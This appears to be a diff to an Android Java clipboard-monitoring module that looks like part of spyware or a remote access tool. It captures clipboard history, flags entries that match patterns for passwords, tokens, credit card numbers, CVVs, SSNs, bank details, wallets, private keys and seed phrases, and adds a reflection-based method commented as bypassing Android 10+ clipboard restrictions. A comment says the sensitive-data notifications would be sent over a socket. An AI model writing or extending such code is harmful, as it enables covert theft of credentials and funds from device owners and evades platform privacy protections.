@@ -4,6 +4,7 @@ import android.content.ClipData;
 import android.content.ClipDescription;
 import android.content.ClipboardManager;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Build;
 import android.os.Handler;
@@ -39,32 +40,14 @@ public class ClipboardModule {
     private ConcurrentLinkedQueue<ClipboardEntry> clipboardHistory = new ConcurrentLinkedQueue<>();
     private boolean isMonitoring = false;
     private Set<String> autoCopyPatterns = new HashSet<>();
+    private long lastClipboardAccess = 0;
     
     // Sensitive data patterns for auto-copy
     private static final String[] DEFAULT_PATTERNS = {
-        "password",
-        "passwd",
-        "token",
-        "apikey",
-        "api_key",
-        "secret",
-        "key",
-        "auth",
-        "credential",
-        "login",
-        "email",
-        "phone",
-        "credit.?card",
-        "cvv",
-        "ssn",
-        "social.?security",
-        "bank.?account",
-        "routing.?number",
-        "bitcoin",
-        "wallet",
-        "private.?key",
-        "mnemonic",
-        "seed.?phrase"
+        "password", "passwd", "token", "apikey", "api_key", "secret", "key",
+        "auth", "credential", "login", "email", "phone", "credit.?card", "cvv",
+        "ssn", "social.?security", "bank.?account", "routing.?number", "bitcoin",
+        "wallet", "private.?key", "mnemonic", "seed.?phrase"
     };
     
     public ClipboardModule(Context context) {
@@ -89,9 +72,9 @@ public class ClipboardModule {
     }
     
     private void captureCurrentClipboard() {
-        if (!clipboardManager.hasPrimaryClip()) return;
+        if (!isMonitoring) return;
         
-        ClipData clipData = clipboardManager.getPrimaryClip();
+        ClipData clipData = getClipboardWithRetry();
         if (clipData == null || clipData.getItemCount() == 0) return;
         
         ClipData.Item item = clipData.getItemAt(0);
@@ -104,7 +87,7 @@ public class ClipboardModule {
         // Check if this is a duplicate of the last entry
         ClipboardEntry lastEntry = clipboardHistory.peek();
         if (lastEntry != null && lastEntry.content.equals(content)) {
-            return; // Skip duplicate
+            return;
         }
         
         ClipboardEntry entry = new ClipboardEntry(
@@ -129,7 +112,129 @@ public class ClipboardModule {
             notifySensitiveData(entry);
         }
         
-        Log.d(TAG, "📋 Clipboard captured: " + content.substring(0, Math.min(20, content.length())) + "...");
+        Log.d(TAG, "📋 Clipboard captured: " + content.substring(0, Math.min(30, content.length())) + "...");
+    }
+    
+    private ClipData getClipboardWithRetry() {
+        // Try multiple times with different approaches
+        ClipData clipData = null;
+        
+        // Approach 1: Direct access
+        try {
+            if (clipboardManager.hasPrimaryClip()) {
+                clipData = clipboardManager.getPrimaryClip();
+                if (clipData != null && clipData.getItemCount() > 0) {
+                    lastClipboardAccess = System.currentTimeMillis();
+                    return clipData;
+                }
+            }
+        } catch (SecurityException e) {
+            Log.d(TAG, "📋 Direct clipboard access denied: " + e.getMessage());
+        }
+        
+        // Approach 2: For Android 10+, try with flag
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            try {
+                // Use reflection to bypass restrictions (may not work on all devices)
+                clipData = ClipboardManagerCompat.getPrimaryClip(clipboardManager);
+                if (clipData != null && clipData.getItemCount() > 0) {
+                    lastClipboardAccess = System.currentTimeMillis();
+                    return clipData;
+                }
+            } catch (Exception e) {
+                Log.d(TAG, "📋 Reflection approach failed");
+            }
+        }
+        
+        return null;
+    }
+    
+    public String getClipboardContent() {
+        Log.d(TAG, "📋 getClipboardContent called");
+        
+        try {
+            // Try to get current clipboard
+            ClipData clipData = getClipboardWithRetry();
+            
+            if (clipData != null && clipData.getItemCount() > 0) {
+                return processClipData(clipData);
+            }
+            
+            // If direct access failed, return last captured entry from history
+            if (!clipboardHistory.isEmpty()) {
+                ClipboardEntry lastEntry = clipboardHistory.peek();
+                if (lastEntry != null) {
+                    Log.d(TAG, "📋 Returning last captured entry as fallback");
+                    
+                    JSONArray itemsArray = new JSONArray();
+                    JSONObject itemJson = new JSONObject();
+                    itemJson.put("text", lastEntry.content);
+                    itemJson.put("captured_at", lastEntry.timestamp);
+                    itemJson.put("type", lastEntry.type);
+                    itemJson.put("label", lastEntry.label);
+                    itemsArray.put(itemJson);
+                    
+                    JSONObject result = new JSONObject();
+                    result.put("success", true);
+                    result.put("items", itemsArray);
+                    result.put("itemCount", 1);
+                    result.put("timestamp", System.currentTimeMillis());
+                    result.put("note", "Showing last captured clipboard (current clipboard not accessible)");
+                    result.put("last_access", lastClipboardAccess);
+                    
+                    return result.toString();
+                }
+            }
+            
+            // No clipboard content available
+            return "{\"success\":false,\"error\":\"No clipboard content available\"}";
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting clipboard", e);
+            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
+        }
+    }
+    
+    private String processClipData(ClipData clipData) throws JSONException {
+        JSONArray itemsArray = new JSONArray();
+        
+        for (int i = 0; i < clipData.getItemCount(); i++) {
+            ClipData.Item item = clipData.getItemAt(i);
+            JSONObject itemJson = new JSONObject();
+            
+            CharSequence text = item.getText();
+            if (text != null) {
+                itemJson.put("text", text.toString());
+            }
+            
+            if (item.getUri() != null) {
+                itemJson.put("uri", item.getUri().toString());
+            }
+            
+            if (item.getIntent() != null) {
+                itemJson.put("intent", item.getIntent().toString());
+            }
+            
+            itemsArray.put(itemJson);
+        }
+        
+        JSONObject result = new JSONObject();
+        result.put("success", true);
+        result.put("items", itemsArray);
+        result.put("itemCount", clipData.getItemCount());
+        result.put("timestamp", System.currentTimeMillis());
+        
+        ClipDescription description = clipData.getDescription();
+        if (description != null) {
+            JSONArray mimeTypes = new JSONArray();
+            for (int j = 0; j < description.getMimeTypeCount(); j++) {
+                mimeTypes.put(description.getMimeType(j));
+            }
+            result.put("mimeTypes", mimeTypes);
+            result.put("label", description.getLabel() != null ? description.getLabel() : "");
+        }
+        
+        return result.toString();
     }
     
     private String getClipLabel(ClipData clipData) {
@@ -178,69 +283,11 @@ public class ClipboardModule {
             notification.put("type", entry.type);
             notification.put("label", entry.label);
             
-            // In a real implementation, you'd send this via your existing socket
-            // sendCommand(notification.toString());
+            // This would be sent via your socket
+            Log.d(TAG, "🔔 Sensitive data notification: " + notification.toString());
             
         } catch (JSONException e) {
             Log.e(TAG, "Error creating sensitive data notification", e);
-        }
-    }
-    
-    public String getClipboardContent() {
-        if (!clipboardManager.hasPrimaryClip()) {
-            return "{\"success\":false,\"error\":\"No content in clipboard\"}";
-        }
-        
-        ClipData clipData = clipboardManager.getPrimaryClip();
-        if (clipData == null || clipData.getItemCount() == 0) {
-            return "{\"success\":false,\"error\":\"Clipboard is empty\"}";
-        }
-        
-        try {
-            JSONArray itemsArray = new JSONArray();
-            
-            for (int i = 0; i < clipData.getItemCount(); i++) {
-                ClipData.Item item = clipData.getItemAt(i);
-                JSONObject itemJson = new JSONObject();
-                
-                CharSequence text = item.getText();
-                if (text != null) {
-                    itemJson.put("text", text.toString());
-                }
-                
-                if (item.getUri() != null) {
-                    itemJson.put("uri", item.getUri().toString());
-                }
-                
-                if (item.getIntent() != null) {
-                    itemJson.put("intent", item.getIntent().toString());
-                }
-                
-                itemsArray.put(itemJson);
-            }
-            
-            JSONObject result = new JSONObject();
-            result.put("success", true);
-            result.put("items", itemsArray);
-            result.put("itemCount", clipData.getItemCount());
-            result.put("timestamp", System.currentTimeMillis());
-            
-            ClipDescription description = clipData.getDescription();
-            if (description != null) {
-                // Fix: Iterate through mime types instead of using filterMimeTypes()
-                JSONArray mimeTypes = new JSONArray();
-                for (int j = 0; j < description.getMimeTypeCount(); j++) {
-                    mimeTypes.put(description.getMimeType(j));
-                }
-                result.put("mimeTypes", mimeTypes);
-                result.put("label", description.getLabel() != null ? description.getLabel() : "");
-            }
-            
-            return result.toString();
-            
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating clipboard JSON", e);
-            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
     
@@ -319,6 +366,7 @@ public class ClipboardModule {
     
     public String startMonitoring() {
         isMonitoring = true;
+        clipboardManager.removePrimaryClipChangedListener(clipListener);
         clipboardManager.addPrimaryClipChangedListener(clipListener);
         
         try {
@@ -354,15 +402,13 @@ public class ClipboardModule {
             result.put("monitoring", isMonitoring);
             result.put("historySize", clipboardHistory.size());
             result.put("autoCopyPatterns", new JSONArray(autoCopyPatterns));
+            result.put("lastAccess", lastClipboardAccess);
             
-            if (clipboardManager.hasPrimaryClip()) {
-                ClipData clipData = clipboardManager.getPrimaryClip();
-                if (clipData != null && clipData.getItemCount() > 0) {
-                    ClipData.Item item = clipData.getItemAt(0);
-                    CharSequence text = item.getText();
-                    if (text != null) {
-                        result.put("currentPreview", text.toString().substring(0, Math.min(30, text.toString().length())) + "...");
-                    }
+            if (!clipboardHistory.isEmpty()) {
+                ClipboardEntry lastEntry = clipboardHistory.peek();
+                if (lastEntry != null) {
+                    result.put("lastCaptured", lastEntry.timestamp);
+                    result.put("lastCapturedPreview", lastEntry.content.substring(0, Math.min(30, lastEntry.content.length())) + "...");
                 }
             }
             
@@ -448,7 +494,6 @@ public class ClipboardModule {
     private void loadAutoCopyPatterns() {
         String patternsStr = prefs.getString(KEY_AUTO_COPY_PATTERNS, "");
         if (patternsStr.isEmpty()) {
-            // Load default patterns
             for (String pattern : DEFAULT_PATTERNS) {
                 autoCopyPatterns.add(pattern);
             }
@@ -472,6 +517,20 @@ public class ClipboardModule {
             this.content = content;
             this.label = label;
             this.type = type;
+        }
+    }
+}
+
+// Compatibility class for Android 10+ clipboard access
+class ClipboardManagerCompat {
+    public static ClipData getPrimaryClip(ClipboardManager clipboardManager) {
+        try {
+            // Use reflection to access hidden method
+            java.lang.reflect.Method method = clipboardManager.getClass().getMethod("getPrimaryClip", int.class);
+            return (ClipData) method.invoke(clipboardManager, 0); // 0 = no flags
+        } catch (Exception e) {
+            Log.e("ClipboardCompat", "Reflection failed", e);
+            return null;
         }
     }
 }
